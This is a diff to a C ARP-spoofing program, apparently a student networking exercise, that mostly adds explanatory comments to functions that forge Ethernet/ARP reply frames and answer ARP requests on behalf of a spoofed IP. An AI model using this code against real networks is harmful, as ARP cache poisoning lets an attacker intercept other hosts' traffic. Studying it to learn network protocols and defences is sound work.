@@ -18,6 +18,8 @@ int validate_ip(const char *ip) {
     return inet_pton(AF_INET, ip, &(sa.sin_addr)) == 1;
 }
 
+// to build a byte (8 bits) -> we shift the 1st hex char by 4 bits and add ( | )
+// the 2nd
 int parse_mac(const char *mac_str, unsigned char *mac) {
     int i = 0;
     int byte_index = 0; 
@@ -46,6 +48,7 @@ void format_mac(const unsigned char *mac, char *str) {
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 }
 
+// search network interface that would be used for external communication
 char *find_interface() {
     struct ifaddrs *ifaddr, *ifa;
     static char interface[IFNAMSIZ];
@@ -67,31 +70,36 @@ char *find_interface() {
     return NULL;
 }
 
+//Creates and sends a spoofed ARP response
 void send_arp_reply(int sockfd, Host *source, Host *target, const char *interface) {
     unsigned char buffer[42];
     struct ether_header *eth = (struct ether_header *) buffer;
     struct ether_arp *arp = (struct ether_arp *) (buffer + 14);
 
+    // create an ethernet frame to help the spoofed arp response using this protocol
     ft_memcpy(eth->ether_shost, source->mac, 6);
     ft_memcpy(eth->ether_dhost, target->mac, 6);
     eth->ether_type = htons(ETHERTYPE_ARP);
 
+    // ARP packet header configuration
     arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
     arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
     arp->ea_hdr.ar_hln = 6;
     arp->ea_hdr.ar_pln = 4;
     arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
 
+    // arp table
     ft_memcpy(arp->arp_sha, source->mac, 6);
     inet_pton(AF_INET, source->ip, arp->arp_spa);
     ft_memcpy(arp->arp_tha, target->mac, 6);
     inet_pton(AF_INET, target->ip, arp->arp_tpa);
 
+    // structure used to specify information about the network interface address for communication
     struct sockaddr_ll sa;
     ft_memset(&sa, 0, sizeof(sa));
     sa.sll_family = AF_PACKET;
-    sa.sll_ifindex = if_nametoindex(interface);
-    sa.sll_halen = ETH_ALEN;
+    sa.sll_ifindex = if_nametoindex(interface); //returns an index for the socket
+    sa.sll_halen = ETH_ALEN; // constant representing an Ethernet address -> 6 bytes
     ft_memcpy(sa.sll_addr, target->mac, 6);
 
     printf(MAGENTA "[📤] Sending ARP reply as spoofed source (%s)...\n" RESET, source->ip);
@@ -104,7 +112,7 @@ void send_arp_reply(int sockfd, Host *source, Host *target, const char *interfac
 }
 
 void wait_and_spoof(int sockfd, Host *source, Host *target, const char *interface) {
-    unsigned char buffer[65536];
+    unsigned char buffer[65536]; // max possible size of an Ethernet packet
     struct ether_header *eth;
     struct ether_arp *arp;
 
@@ -112,7 +120,8 @@ void wait_and_spoof(int sockfd, Host *source, Host *target, const char *interfac
 
     while (running) {
         ssize_t length = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
-        if (length < 0) continue;
+        if (length < 0) 
+            continue;
 
         eth = (struct ether_header*) buffer;
 
@@ -120,7 +129,7 @@ void wait_and_spoof(int sockfd, Host *source, Host *target, const char *interfac
             arp = (struct ether_arp*)(buffer + 14);
 
             if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) {
-                char requested_ip[16];
+                char requested_ip[16]; // max possible size of an char IPv4 addr
                 inet_ntop(AF_INET, arp->arp_tpa, requested_ip, sizeof(requested_ip));
 
                 if (ft_strcmp(requested_ip, source->ip) == 0) {
